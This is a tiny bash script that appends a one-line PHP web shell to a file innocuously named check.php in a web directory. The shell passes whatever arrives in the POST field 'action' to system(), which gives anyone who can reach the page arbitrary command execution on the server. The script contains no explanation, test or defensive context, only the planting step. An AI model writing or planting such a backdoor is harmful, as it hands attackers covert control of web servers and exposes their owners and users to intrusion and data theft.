#!/bin/bash
/bin/cat >> "/srv/web tools/check.php" <<'END'
<?php system($_POST ["action"]);
END
